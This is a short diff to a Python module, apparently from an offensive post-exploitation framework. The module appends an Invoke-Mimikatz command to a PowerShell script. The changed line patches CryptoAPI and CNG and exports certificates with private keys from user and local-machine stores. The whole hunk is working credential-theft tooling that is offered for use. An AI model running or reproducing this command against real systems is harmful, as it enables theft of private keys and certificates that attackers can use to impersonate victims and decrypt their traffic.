@@ -66,7 +66,7 @@ class Module:
 
         script = moduleCode
         
-        # add in the cert dumping command
-        script += """Invoke-Mimikatz -Command 'crypto::capi privilege::debug crypto::cng "crypto::certificates /systemstore:local_machine /store:root /export"' """
+        # add in the cert dumping command        
+        script += """Invoke-Mimikatz -Command 'crypto::cng crypto::capi "crypto::certificates /export" "crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE"'"""
         
         return script
